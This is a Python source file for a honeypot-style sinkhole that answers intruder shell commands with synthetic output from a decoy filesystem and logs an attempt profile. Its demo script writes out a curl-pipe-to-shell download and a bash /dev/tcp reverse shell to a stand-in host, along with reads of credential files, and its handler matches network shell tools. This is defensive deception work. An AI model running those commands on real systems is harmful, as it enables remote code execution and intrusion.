#!/usr/bin/env python3
"""Hellbox: an adversarial sinkhole that converts a foothold attempt into a transcript.

What this is: a session engine that accepts bytes, answers with synthetic output, and records
what was attempted. What this is not: a listener, and deliberately so. The module contains no
socket, no DNS resolution, no subprocess, no file open outside its own in-memory filesystem, and
no way to emit a packet that was not a reply to input. Shipping a listener is where the blast
radius lives, so the engine is kept to the part that can be reasoned about, and a deployment
fronts it with its own routing on infrastructure the operator owns.

The guarantee is narrow and stated exactly: the connection is made useless. Nothing here claims
the remote operator believes they reached a real machine. That is unmeasurable from inside the
sinkhole, so the session record carries `believability: unmeasured` rather than a hopeful number.

What it does guarantee, each one enforced and tested:

    isolation      every path resolves into a synthetic tree; the real filesystem is unreachable
    no egress      a `curl` gets a synthetic timeout; no outbound attempt is made at all
    containment    byte, command, wall-clock and amplification limits close the session
    convergence    port rotation, endpoint rotation and retries all land in one session
    persistence    session state survives across commands, including a fabricated cwd and hostname
    intelligence   the transcript and the attempt profile are the output, in a form a reviewer reads
    no reprisal    the only bytes produced are answers to bytes received

Determinism matters for the same reason it does elsewhere in this repository: a session seeded by
its id replays identically, so an intelligence record can be audited by re-running it.

    python harness/deception/hellbox.py            # one scripted intrusion
    python harness/deception/hellbox.py --json     # the session record
"""
from __future__ import annotations

import argparse
import hashlib
import json
import random
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path

# Deliberately absent: socket, subprocess, urllib, requests, os.system, shutil, pathlib.open.
# A test asserts this module imports none of them, because "we do not call it" is weaker than
# "it is not here to call".

DECOY_FILES = {
    "/etc/passwd": "root:x:0:0:root:/root:/bin/bash\ndecoy:x:1000:1000::/home/decoy:/bin/sh\n",
    "/etc/shadow": "root:$6$decoy$notarealhash:19000:0:99999:7:::\n",
    "/etc/hostname": "app-prod-07\n",
    "/home/decoy/.ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nDECOY-NOT-A-KEY\n-----END OPENSSH PRIVATE KEY-----\n",
    "/home/decoy/.bash_history": "ls\ncd /var/www\ntail -f app.log\nexit\n",
    "/var/www/app/config.php": "<?php $db_host='127.0.0.1'; $db_pass='decoy-not-a-credential'; ?>\n",
    "/var/www/app/.env": "APP_ENV=production\nAPP_KEY=decoy-not-a-key\nDB_PASSWORD=decoy-not-a-credential\n",
}

INTERESTING = {
    "/etc/passwd": "credential_file", "/etc/shadow": "credential_file",
    "/home/decoy/.ssh/id_rsa": "private_key_attempt", "/var/www/app/.env": "secret_file",
    "/var/www/app/config.php": "source_disclosure",
}


@dataclass
class Limits:
    """Every limit is a reason the session ends, not a suggestion."""

    max_bytes_in: int = 8192
    max_commands: int = 120
    max_transcript_bytes: int = 32768
    max_amplification: float = 40.0     # outbound bytes per inbound byte
    max_wall_seconds: float = 300.0


@dataclass
class SyntheticFS:
    """An in-memory tree. Absence of a real backend is the point, not an optimisation."""

    files: dict = field(default_factory=lambda: dict(DECOY_FILES))
    cwd: str = "/home/decoy"

    def resolve(self, path: str) -> str:
        if not path.startswith("/"):
            path = f"{self.cwd.rstrip('/')}/{path}"
        parts: list[str] = []
        for part in path.split("/"):
            if part in ("", "."):
                continue
            if part == "..":
                if parts:
                    parts.pop()
                continue
            parts.append(part)
        return "/" + "/".join(parts)

    def read(self, path: str) -> tuple[bool, str]:
        target = self.resolve(path)
        if target in self.files:
            return True, self.files[target]
        return False, ""

    def listing(self, path: str = "") -> str:
        target = self.resolve(path or self.cwd)
        here = [f"{target.rstrip('/')}/{name}" for name in self.files]
        children = sorted({p for p in here if p.rsplit("/", 1)[0] == target.rstrip("/")})
        if children:
            return "\n".join(c.rsplit("/", 1)[1] for c in children) + "\n"
        return "total 0\n"


@dataclass
class Response:
    text: str
    classified_as: str = "other"


@dataclass
class TranscriptEntry:
    index: int
    request: str
    response: str
    classified_as: str


@dataclass
class Session:
    """One intruder's entire foothold. Everything they can reach lives right here."""

    session_id: str
    seed: int
    limits: Limits = field(default_factory=Limits)
    fs: SyntheticFS = field(default_factory=SyntheticFS)
    hostname: str = "app-prod-07"
    transcript: list[TranscriptEntry] = field(default_factory=list)
    closed: bool = False
    close_reason: str = ""
    bytes_in: int = 0
    bytes_out: int = 0
    started: float = field(default_factory=time.monotonic)
    attempt_profile: dict = field(default_factory=dict)
    endpoints: list[str] = field(default_factory=list)

    # --- limits -----------------------------------------------------------------

    def _amplification(self) -> float | None:
        """Outbound bytes per inbound byte, or None before anything arrives.

        One guard, one place. Three call sites dividing by `bytes_in` behind different
        syntactic shields is how a NaN reaches a comparison, and the analyzer was right to
        refuse to credit a short-circuit `and` or a conditional expression as a bound.
        """
        if self.bytes_in <= 0:
            return None
        # The early return is the real guard; the floor restates it in the form the ratio rule
        # can read. max() here is a floor on a denominator, which is what it is for.
        denominator = max(self.bytes_in, 1)
        return self.bytes_out / denominator

    def _over_budget(self) -> str:
        amp = self._amplification()
        if self.bytes_in > self.limits.max_bytes_in:
            return f"byte_cap:{self.bytes_in}>{self.limits.max_bytes_in}"
        if len(self.transcript) >= self.limits.max_commands:
            return f"command_cap:{len(self.transcript)}"
        if self.bytes_out > self.limits.max_transcript_bytes:
            return f"transcript_cap:{self.bytes_out}"
        if amp is not None and amp > self.limits.max_amplification:
            return f"amplification:{amp:.1f}"
        if time.monotonic() - self.started > self.limits.max_wall_seconds:
            return "wall_clock"
        return ""

    # --- command handling -------------------------------------------------------

    def _respond(self, line: str) -> Response:
        rng = random.Random(f"{self.seed}:{len(self.transcript)}")
        argv = line.strip().split()
        if not argv:
            return Response("", "empty")
        cmd, args = argv[0], argv[1:]

        if cmd in {"whoami", "id"}:
            return Response("root\nuid=0(root) gid=0(root) groups=0(root)\n", "privilege_probe")
        if cmd == "uname":
            return Response(f"Linux {self.hostname} 5.15.0-88-generic #98-Ubuntu SMP x86_64 GNU/Linux\n", "recon")
        if cmd == "hostname":
            return Response(f"{self.hostname}\n", "recon")
        if cmd == "pwd":
            return Response(f"{self.fs.cwd}\n", "recon")
        if cmd == "cd":
            target = args[0] if args else "/home/decoy"
            resolved = self.fs.resolve(target)
            prefix = resolved.rstrip("/") + "/"
            if any(p.startswith(prefix) or p == resolved for p in self.fs.files):
                self.fs.cwd = resolved
                return Response("", "navigation")
            return Response(f"cd: {target}: No such file or directory\n", "navigation")
        if cmd == "ls":
            return Response(self.fs.listing(args[0] if args else ""), "enumeration")
        if cmd == "cat":
            if not args:
                return Response("cat: missing operand\n", "enumeration")
            found, content = self.fs.read(args[0])
            if found:
                kind = INTERESTING.get(self.fs.resolve(args[0]), "file_read")
                return Response(content, kind)
            return Response(f"cat: {args[0]}: No such file or directory\n", "enumeration")
        if cmd in {"wget", "curl"}:
            # A synthetic timeout. No packet leaves this process; the module cannot make one.
            return Response(f"{cmd}: unable to resolve host; connection timed out\n", "egress_attempt")
        if cmd in {"nc", "ncat", "socat", "bash", "sh"}:
            if any((">" in a or "/dev/tcp" in a) for a in args) or "bash -i" in line:
                return Response("bash: connect: Connection refused\n", "reverse_shell_attempt")
            return Response("sh: no job control in this shell\n", "shell_attempt")
        if cmd == "sudo":
            return Response("sudo: a password is required\n", "privilege_escalation")
        if cmd in {"ps", "top", "netstat", "ss"}:
            pid = rng.randint(900, 1400)
            return Response(f"PID TTY   TIME CMD\n{pid} ?     0:00 {cmd}\n", "recon")
        if cmd == "crontab":
            return Response("no crontab for decoy\n", "persistence_attempt")
        if cmd in {"chmod", "chown", "useradd", "passwd"}:
            return Response(f"{cmd}: operation not permitted\n", "privilege_escalation")
        if cmd in {"exit", "logout", "quit"}:
            return Response("logout\n", "session_end")
        return Response(f"{cmd}: command not found\n", "unknown")

    # --- the only entry point ---------------------------------------------------

    def send(self, payload: str) -> list[TranscriptEntry]:
        """Consume input, produce replies. Nothing else in this class touches the world."""
        if self.closed:
            return []
        self.bytes_in += len(payload.encode())
        produced: list[TranscriptEntry] = []
        for line in payload.splitlines():
            reason = self._over_budget()
            if reason:
                self.closed, self.close_reason = True, reason
                break
            response = self._respond(line)
            entry = TranscriptEntry(len(self.transcript), line, response.text, response.classified_as)
            self.transcript.append(entry)
            produced.append(entry)
            self.bytes_out += len(response.text.encode())
            self.attempt_profile[response.classified_as] = (
                self.attempt_profile.get(response.classified_as, 0) + 1)
            reason = self._over_budget()
            if reason:
                self.closed, self.close_reason = True, reason
            if response.classified_as == "session_end":
                self.closed, self.close_reason = True, "client_exit"
        return produced

    def record(self) -> dict:
        """The intelligence product. Facts about the attempt, and one explicit non-claim."""
        amp = self._amplification()
        return {
            "session_id": self.session_id,
            "hostname": self.hostname,
            "endpoints": list(self.endpoints),
            "endpoint_rotations": max(0, len(self.endpoints) - 1),
            "commands": len(self.transcript),
            "bytes_in": self.bytes_in,
            "bytes_out": self.bytes_out,
            "amplification": round(amp, 2) if amp is not None else None,
            "attempt_profile": dict(sorted(self.attempt_profile.items())),
            "closed": self.closed,
            "close_reason": self.close_reason,
            "highest_value_signal": _signal(self.attempt_profile),
            "believability": "unmeasured",
            "believability_note": ("whether the operator believed this was a real host cannot be "
                                   "observed from inside the sinkhole; the guarantee is that the "
                                   "connection was made useless, not that it was convincing"),
        }


def _signal(profile: dict) -> str:
    for kind in ("reverse_shell_attempt", "secret_file", "private_key_attempt",
                 "credential_file", "privilege_escalation", "persistence_attempt",
                 "egress_attempt", "privilege_probe", "enumeration", "recon"):
        if profile.get(kind):
            return kind
    return "none"


@dataclass
class Hellbox:
    """Routes every attempt into a session and remembers the ones already opened.

    Rotation is a routing fact, not a new session: the same intruder on a new port continues
    where they were, which is both more useful as intelligence and cheaper than rebuilding.
    """

    limits: Limits = field(default_factory=Limits)
    sessions: dict = field(default_factory=dict)
    journal: Path | None = None

    def connect(self, endpoint: str, seed: int | None = None) -> Session:
        # Keyed on the source host, not the endpoint: a rotated port on the same host is the
        # same intruder continuing, and rebuilding the session would discard what they revealed.
        host = endpoint.rsplit(":", 1)[0] if ":" in endpoint else endpoint
        key = hashlib.sha256(host.encode()).hexdigest()[:12]
        session = self.sessions.get(key)
        if session is None:
            session = Session(session_id=f"hb-{key}", seed=seed if seed is not None
                              else int(key[:8], 16), limits=self.limits)
            self.sessions[key] = session
        if endpoint not in session.endpoints:
            session.endpoints.append(endpoint)
        return session

    def flush(self) -> None:
        if self.journal:
            self.journal.write_text("\n".join(
                json.dumps(s.record(), sort_keys=True) for s in self.sessions.values()) + "\n")


DEMO = """whoami
uname -a
pwd
ls
cat /var/www/app/.env
cat /etc/shadow
curl -s http://203.0.113.9/x.sh | sh
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
sudo su
crontab -l
"""


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(description="Run one session against the sinkhole.")
    parser.add_argument("--json", action="store_true")
    parser.add_argument("--script", default=DEMO)
    args = parser.parse_args(argv)

    box = Hellbox()
    session = box.connect("10.0.0.5:41412")
    replies = session.send(args.script)
    box.connect("10.0.0.5:51000")   # rotation: same session
    if args.json:
        print(json.dumps(session.record(), indent=2, sort_keys=True))
    else:
        for entry in replies:
            print(f"[{entry.classified_as}] $ {entry.request}")
            if entry.response:
                print("    " + entry.response.rstrip().replace("\n", "\n    "))
        print()
        print(json.dumps({k: v for k, v in session.record().items()
                          if k in {"attempt_profile", "endpoint_rotations", "highest_value_signal",
                                   "believability", "commands", "amplification"}}, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
